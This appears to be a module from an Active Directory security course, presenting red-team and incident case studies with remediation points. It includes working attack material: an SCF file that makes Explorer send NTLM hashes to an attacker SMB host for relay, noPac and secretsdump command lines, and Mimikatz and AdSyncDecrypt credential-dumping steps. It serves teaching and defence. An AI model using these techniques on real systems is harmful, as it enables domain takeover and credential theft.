# Module 12: Real-World Case Studies & Operational War Stories

> **Navigation**: [⬅️ Module 11: Zero-Trust Defense & SIEM](Module-11-Enterprise-Defense-Zero-Trust-and-Detection.md) | [🏠 Master Index](../README.md) | [🧪 Hands-On Labs ➡️](../README.md#-hands-on-practical-labs)

---


## Case Study 1: The Zero-Click SCF Share Trap in a Global Financial Institution

### 1. The Scenario
During an internal red team assessment of a Fortune 500 retail bank, the engagement team obtained an initial foothold on a low-privileged workstation in the wealth management division (`10.100.14.22`). Endpoint Detection and Response (EDR) was heavily tuned on workstations, blocking interactive PowerShell beacons, memory injection, and process hollowing.

The assessment team discovered an internal network file share hosted on a member server:
$$\text{\\\\nas01.corp.bank\\Accounting\_Drop}$$
The share permissions granted `Everyone` write and modify access (`FILE_GENERIC_WRITE`).

```
+-----------------------------------------------------------------------------------------+
| ZERO-CLICK SCF HARVESTING & ESC8 RELAY CHAIN                                            |
|                                                                                         |
|  ATTACKER LISTENER                   ACCOUNTING WORKSTATIONS      AD CS CA SERVER       |
|  IP: 10.100.14.88                    Browsing \\nas01             (ca01.corp.bank)      |
|         |                                    |                            |             |
|         | 1. Drops @invoice.scf into share   |                            |             |
|         +===================================>|                            |             |
|         |                                    |                            |             |
|         |                                    | User browses share.        |             |
|         |                                    | Explorer parses .scf icon: |             |
|         |                                    | [Shell]                    |             |
|         |                                    | IconFile=\\10.100.14.88\x  |             |
|         |                                    |                            |             |
|         | 2. Outbound SMB NTLM Authentication|                            |             |
|         |<-----------------------------------+                            |             |
|         |                                                                 |             |
|         | 3. ntlmrelayx Relays Auth to CA Web Enrollment                  |             |
|         +---------------------------------------------------------------->|             |
|         |                                                                 |             |
|         | 4. Returns Machine Certificate for High-Privilege Workstation   |             |
|         |<================================================================+             |
+-----------------------------------------------------------------------------------------+
```

### 2. Execution Tradecraft: The `.scf` File Vector
The team crafted a Windows Explorer Shell Command File (`@invoice.scf`). The `@` character was prepended to ensure the file appeared at the very top of the folder list.

```ini
[Shell]
Command=2
IconFile=\\10.100.14.88\shared\icons\bank.ico
[Taskbar]
Command=ToggleDesktop
```

#### Why it Works Without User Clicking:
When an administrative employee opens Windows Explorer to browse the folder, Windows Explorer attempts to render the file's icon preview. To retrieve `bank.ico`, the operating system automatically sends an outbound SMB authentication packet containing the logged-in user's **NetNTLMv2 hash** to the attacker's IP (`10.100.14.88`). **The user does not click, open, or execute the file.**

### 3. Escalation: From NetNTLM to Domain Takeover in 14 Minutes
The captured NetNTLM authentication belonged to an IT Support workstation account (`WS-IT-09$`). 
Simultaneously, `impacket-ntlmrelayx` was listening on `10.100.14.88` targeting the bank’s internal Certificate Authority web enrollment interface (`http://ca01.corp.bank/certsrv/`).
1. `ntlmrelayx` relayed the workstation's NTLM authentication to `/certsrv/certfnsh.asp`.
2. The CA issued an X.509 client authentication certificate for `WS-IT-09$`.
3. The team used `certipy auth` to authenticate via PKINIT, obtaining the machine account's NT hash.
4. Using the workstation machine account, the team discovered the computer held `GenericWrite` rights over a security group containing the enterprise backup service accounts.
5. Escalated to Domain Admin within 14 minutes of dropping the file.

---

## Case Study 2: Hospital Ransomware Precursor via Unconstrained Delegation

### 1. The Scenario
A regional healthcare network managing four hospitals and over 6,000 medical endpoints suffered an intrusion. Incident response investigations revealed that the threat actor gained initial access via a spear-phishing email targeting an HR employee.

From the HR workstation, the attacker scanned the domain and identified a legacy PACS (Picture Archiving and Communication System) radiology server (`PACS01.hospital.local`) running Windows Server 2012.

```
+-----------------------------------------------------------------------------------------+
| RADIOLOGY PACS UNCONSTRAINED DELEGATION TAKEOVER                                        |
|                                                                                         |
|  ATTACKER (Compromised PACS01)                         DOMAIN CONTROLLER (DC-BACKUP$)   |
|  (TRUSTED_FOR_DELEGATION Enabled)                      IP: 10.20.1.2                    |
|            |                                                   |                        |
|            | 1. Exploits SpoolSample RPC Coercion              |                        |
|            |    RpcRemoteFindFirstPrinterChangeNotificationEx  |                        |
|            +-------------------------------------------------->|                        |
|                                                                |                        |
|                                                                | DC-BACKUP connects     |
|                                                                | via SMB to PACS01.     |
|                                                                | Forwards TGT!          |
|                                                                |                        |
|            | 2. DC-BACKUP$ Authenticates & Caches TGT in LSASS |                        |
|            |<--------------------------------------------------+                        |
|                                                                                         |
|  Attacker dumps DC-BACKUP$ TGT via Mimikatz (sekurlsa::tickets)                         |
|  Executes DCSync -> Obtains KRBTGT -> Forges Golden Ticket -> Complete Domain Lockdown! |
+-----------------------------------------------------------------------------------------+
```

### 2. Root Cause Analysis:
* The `PACS01$` computer object had the `TRUSTED_FOR_DELEGATION` attribute (`userAccountControl` bitmask `0x80000`) enabled ten years earlier during application installation.
* The Print Spooler service (`spoolsv.exe`) was active on the secondary Domain Controller (`DC-BACKUP`).
* **The Exploit**: The attacker executed `SpoolSample.exe` from `PACS01`, coercing `DC-BACKUP` to authenticate to `PACS01`.
* Because `PACS01` was configured with Unconstrained Delegation, `DC-BACKUP` forwarded its **Ticket Granting Ticket (TGT)**.
* The attacker extracted the TGT from `PACS01`'s LSASS memory using `sekurlsa::tickets /export`, injected it into their session, executed DCSync, and compromised all 6,000 hospital systems.

---

## Case Study 3: The noPac DC Spoofing Takeover (CVE-2021-42278 & CVE-2021-42287)

The **noPac** exploit chain combines two subtle Active Directory vulnerabilities into one of the most critical remote privilege escalation exploits in Windows history.

```
+-----------------------------------------------------------------------------------------+
| THE NOPAC DOMAIN CONTROLLER SPOOFING EXPLOIT CHAIN                                      |
|                                                                                         |
|  1. CREATE MACHINE ACCOUNT:                                                             |
|     Attacker uses standard domain account to create computer: TEMPMC$                   |
|                                                                                         |
|  2. STRIP TRAILING '$' (CVE-2021-42278):                                                |
|     Attacker renames sAMAccountName from TEMPMC$ to DC01 (Name of real DC without $)    |
|                                                                                         |
|  3. REQUEST TGT FOR SPOOFED NAME:                                                       |
|     Attacker requests TGT for user: DC01.                                               |
|     KDC issues valid TGT for DC01 (using Attacker's machine account password)!          |
|                                                                                         |
|  4. RENAME MACHINE ACCOUNT BACK:                                                        |
|     Attacker renames machine account back to TEMPMC$ (Freeing up name DC01).            |
|                                                                                         |
|  5. TGS REQUEST WITH PAC VALIDATION BYPASS (CVE-2021-42287):                            |
|     Attacker presents the DC01 TGT to request a service ticket for cifs/DC01.corp.local.|
|     The KDC cannot find account DC01 in the directory.                                  |
|     KDC AUTOMATICALLY APPENDS '$' AND SEARCHES FOR: DC01$!                              |
|     KDC finds the REAL DOMAIN CONTROLLER (DC01$)!                                       |
|     KDC issues a Service Ticket for the REAL DC01$ Machine Account!                     |
|                                                                                         |
|  6. DCSYNC AS DOMAIN CONTROLLER:                                                        |
|     Attacker uses the TGS to execute DCSync and extract all domain hashes!              |
+-----------------------------------------------------------------------------------------+
```

### Real-World Execution:
```bash
# Automated noPac exploitation using noPac.py:
python3 noPac.py 'corp.local/jdoe:Pass123!' -dc-ip 10.0.0.1 \
  -dc-name DC01 -use-ldap --dump-ad
```
* **Impact**: Elevated any authenticated domain user to Domain Admin in **under 30 seconds**.
* **Remediation**: Patched via Microsoft Security Updates KB5008102 and KB5008380.

---

## Case Study 4: SolarWinds, Golden SAML & ADFS Cloud-to-Ground Movement

During the infamous SolarWinds / UNC2452 cyber espionage campaign, adversaries targeted hybrid identity architectures connecting on-premises Active Directory to Microsoft Entra ID (Azure AD).

### The Golden SAML Technique:
Active Directory Federation Services (ADFS) issues signed Security Assertion Markup Language (SAML) tokens to authenticate on-premises users into cloud applications (Microsoft 365, AWS, Salesforce).

```
+-----------------------------------------------------------------------------------+
| GOLDEN SAML ATTACK MECHANICS                                                      |
|                                                                                   |
|  1. Attacker achieves local administrator on the internal ADFS Server.            |
|  2. Extracts the Token-Signing Private Key (stored in ADFS DKM container).        |
|  3. Attacker moves to an external, untracked server outside the corporate network.|
|  4. Forges arbitrary SAML 2.0 assertions for any user (e.g., CEO, Cloud Admin):   |
|     - ImmutableID matching victim's cloud identity                                |
|     - Valid signature generated using stolen Token-Signing Private Key            |
|  5. Submits forged assertion directly to https://login.microsoftonline.com/       |
|  6. Entra ID validates the signature against the federated trust certificate.     |
|     ACCESS GRANTED! Full cloud compromise without touching on-premises AD again!  |
+-----------------------------------------------------------------------------------+
```

### Forensic Takeaway:
* Changing the user's Active Directory password or enabling multi-factor authentication (MFA) **DID NOT STOP THE ATTACKER**.
* The only remediation was revoking and rotating the entire ADFS Token-Signing certificate infrastructure and recreating the federation trust.

---

## Case Study 5: Trimarc Security Field Insights (Sean Metcalf)

Sean Metcalf, Microsoft Certified Master in Active Directory and founder of Trimarc Security, has analyzed hundreds of enterprise Active Directory deployments. His research documents the top 5 most prevalent architecture vulnerabilities in enterprise networks:

```
+---------------------------------------------------------------------------------------+
| TRIMARC SECURITY: TOP 5 ENTERPRISE ACTIVE DIRECTORY SECURITY VULNERABILITIES           |
+---+-----------------------------------+-----------------------------------------------+
| # | Vulnerability Finding             | Real-World Enterprise Risk                    |
+---+-----------------------------------+-----------------------------------------------+
| 1 | **Domain Admin Credentials Cached | Administrative staff use Domain Admin accounts|
|   | on Standard Workstations**        | to log into end-user laptops for support.     |
|   |                                   | LSASS dumping gives attackers instant Domain  |
|   |                                   | Admin on Day 1 of an engagement.              |
+---+-----------------------------------+-----------------------------------------------+
| 2 | **Service Accounts in Domain      | Third-party software (backup tools, antivirus,|
|   | Admins with Static Passwords**    | monitoring agents) configured with permanent  |
|   |                                   | Domain Admin rights and static 8-character    |
|   |                                   | passwords that never expire.                  |
+---+-----------------------------------+-----------------------------------------------+
| 3 | **Unmanaged Active Directory      | Certificate templates left with ESC1 or ESC8  |
|   | Certificate Services (AD CS)**    | vulnerabilities, allowing any authenticated   |
|   |                                   | user to forge Domain Admin certificates.      |
+---+-----------------------------------+-----------------------------------------------+
| 4 | **ms-DS-MachineAccountQuota = 10**| Default quota permitting any user to register |
|   |                                   | 10 computer accounts, fueling RBCD and KrbRelay|
|   |                                   | privilege escalation attacks.                 |
+---+-----------------------------------+-----------------------------------------------+
| 5 | **Absence of Administrative       | Single administrative account used across all |
|   | Tiering (No PAWs)**               | systems. Zero isolation between workstation   |
|   |                                   | help desk support and Domain Controller ops.  |
+---+-----------------------------------+-----------------------------------------------+
```

---

## Case Study 6: The Azure AD Connect Hybrid Identity Takeover (`MSOL_` Dump)

In modern enterprise environments, on-premises Active Directory is synchronized with Microsoft Entra ID (Azure AD) to enable single sign-on (SSO) for Microsoft 365 and cloud workloads.

```
+-----------------------------------------------------------------------------------------+
| HYBRID IDENTITY COMPROMISE: AZURE AD CONNECT REPLICATION THEFT                          |
|                                                                                         |
|  1. ATTACKER COMPROMISES AAD CONNECT SERVER:                                            |
|     Gains local administrative access to the Azure AD Connect host (e.g. AADSYNC01).    |
|                                                                                         |
|  2. EXTRACTS ENCRYPTED SYNC CREDENTIALS:                                                |
|     Azure AD Connect stores service account credentials in Microsoft SQL Server LocalDB |
|     instance: (localdb)\.\ADSync (Table: mms_management_agent).                         |
|                                                                                         |
|  3. DECRYPTS DPAPI KEYSET (AdSyncDecrypt.ps1):                                          |
|     Attacker uses local SYSTEM DPAPI master key to decrypt the sync configuration.      |
|     REVEALS: Plaintext password of on-premises sync account: CORP\MSOL_38192a819b2     |
|                                                                                         |
|  4. EXECUTES ON-PREMISES DCSYNC:                                                        |
|     By Microsoft architectural design, the MSOL_ account holds FULL DCSYNC REPLICATION  |
|     RIGHTS on the domain root to synchronize password hashes up to the cloud!           |
|     Attacker executes secretsdump using MSOL_ -> Entire On-Premises Domain Compromised! |
|                                                                                         |
|  5. CLOUD DIRECTORY TAKEOVER:                                                           |
|     Attacker abuses sync account or AADInternals to inject cloud backdoors or modify     |
|     federated domain settings -> Complete Hybrid Enterprise Takeover!                   |
+-----------------------------------------------------------------------------------------+
```

### Operational Attack Execution:
```powershell
# Execute AdSyncDecrypt on the compromised Azure AD Connect server:
Import-Module .\AdSyncDecrypt.ps1
Get-ADSyncCredentials
```

```text
======================================================================
On-Premises AD Sync Account:
  Domain       : CORP
  Username     : MSOL_a9182374619b
  Password     : P@ssw0rd_Generated_By_Azure_AD_Connect_128Bit!
  Permissions  : DS-Replication-Get-Changes-All (DCSync Enabled)

Azure AD Cloud Connector:
  Cloud User   : Sync_AADSYNC01_1b2c3@corp.onmicrosoft.com
  Access Type  : Directory Synchronization Account
======================================================================
```

#### Weaponizing the Recovered `MSOL_` Account:
From your attack box, immediately invoke DCSync using the stolen `MSOL_` credentials:
```bash
impacket-secretsdump 'corp.local/MSOL_a9182374619b:P@ssw0rd_Generated_By_Azure_AD_Connect_128Bit!@10.0.0.1' -just-dc-user krbtgt
```

### Forensic Takeaway:
* Azure AD Connect servers are **Tier 0 Control Plane assets**.
* If an organization categorizes their Azure AD Connect server as a standard Tier 1 server (allowing standard server administrators to log in), the entire on-premises forest and cloud tenant can be compromised in minutes!

---

> **Navigation**: [⬅️ Module 11: Zero-Trust Defense & SIEM](Module-11-Enterprise-Defense-Zero-Trust-and-Detection.md) | [🏠 Master Index](../README.md) | [🧪 Hands-On Labs ➡️](../README.md#-hands-on-practical-labs)
